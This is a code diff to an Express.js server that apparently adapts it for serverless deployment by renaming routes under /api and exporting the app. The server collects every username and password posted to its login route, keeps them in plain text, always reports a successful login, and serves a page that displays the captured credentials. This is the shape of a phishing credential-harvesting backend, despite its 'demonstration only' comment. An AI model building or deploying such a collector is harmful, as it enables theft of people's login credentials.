@@ -1,7 +1,7 @@
+// api/index.js
 const express = require('express');
 const cors = require('cors');
 const app = express();
-const port = 3000;
 
 // Store credentials in memory (for demonstration only)
 // In a real application, you would use a proper database
@@ -12,7 +12,7 @@ app.use(cors());
 app.use(express.json());
 
 // Serve a simple HTML page to display credentials
-app.get('/', (req, res) => {
+app.get('/api', (req, res) => {
   const html = `
     <!DOCTYPE html>
     <html>
@@ -71,26 +71,24 @@ app.get('/', (req, res) => {
 });
 
 // Handle login requests
-app.post('/login', (req, res) => {
+app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
   
   // Basic validation
   if (!username || !password) {
     return res.status(400).json({ message: 'Username and password are required' });
   }
-
+  
   // Store the credentials with timestamp
   credentials.push({
     username,
     password,
     timestamp: new Date().toLocaleString()
   });
-
+  
   // Send success response
   res.json({ message: 'Login successful' });
 });
 
-// Start the server
-app.listen(port, () => {
-  console.log(`Server running at http://localhost:${port}`);
-});
+// Export the Express API
+module.exports = app;
